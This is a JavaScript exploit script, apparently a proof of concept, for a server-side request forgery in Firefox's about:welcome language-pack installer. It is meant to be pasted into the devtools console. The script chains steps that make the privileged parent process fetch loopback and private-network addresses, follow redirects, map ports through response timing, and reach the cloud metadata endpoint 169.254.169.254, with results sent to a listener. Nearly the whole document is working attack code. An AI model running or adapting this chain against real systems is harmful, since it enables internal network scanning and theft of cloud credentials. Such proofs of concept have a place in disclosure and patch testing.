// Firefox LangPack parent-process SSRF — full chain, paste into the about:welcome devtools console.
"use strict";
(async () => {
  const LISTENER = "http://127.0.0.1:8798";
  const w = window.wrappedJSObject || window;

  console.log("Step 1: confirming page scope exposes the sink...");
  if (typeof w.AWEnsureLangPackInstalled !== "function") {
    console.log("  ABORT: AWEnsureLangPackInstalled missing — not about:welcome scope");
    return;
  }
  console.log("  AWEnsureLangPackInstalled present (no feature flag needed)");

  const call = async (label, url) => {
    const arg = (w.JSON || JSON).parse(JSON.stringify({
      langPack: { url, hash: "sha256:" + "0".repeat(64), target_locale: "zz-ZZ" },
      requestSystemLocales: ["en-US"], langPackDisplayName: "probe"
    }));
    const t0 = Date.now();
    const settle = await w.AWEnsureLangPackInstalled(arg, (w.JSON||JSON).parse("{}"))
      .then(() => "resolved", () => "rejected");
    console.log(`  ${label}: ${Date.now() - t0}ms (${settle})`);
  };

  console.log("Step 2: loopback fetch by the PARENT process...");
  await call("loopback", LISTENER + "/LANGPACK-SSRF");

  console.log("Step 3: RFC1918 reachability...");
  await call("rfc1918", "http://10.0.2.15:8798/RFC1918-OPEN");

  console.log("Step 4: redirect following (hop1 -> hop2)...");
  await call("redirect", LISTENER + "/redir");

  console.log("Step 5: port oracle — open vs closed vs filtered...");
  await call("closed :9   ", "http://127.0.0.1:9/CLOSED-PORT");
  await call("filtered    ", "http://10.255.255.1:80/FILTERED");

  console.log("Step 6: cloud metadata IP (not refused by validation)...");
  await call("metadata", "http://169.254.169.254/latest/meta-data/");

  console.log("CHAIN COMPLETE — check listener / collaborator");
  console.log("Every call 'rejects' = post-download signature failure, not a pre-fetch block.");
})();
